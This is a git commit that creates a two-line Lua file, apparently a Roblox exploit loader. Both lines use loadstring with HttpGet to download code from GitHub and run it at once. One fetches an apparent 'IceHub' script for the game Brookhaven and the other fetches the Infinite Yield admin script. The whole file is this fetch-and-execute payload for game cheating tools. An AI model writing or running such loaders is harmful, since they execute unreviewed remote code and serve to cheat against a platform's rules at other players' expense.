7e75b7921e2425a2cf2d6b0039ef6837a3f142dc
Lewis-Collier <112239446+Lewis-Collier@users.noreply.github.com>
2023-08-02 10:03:11 +0100

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
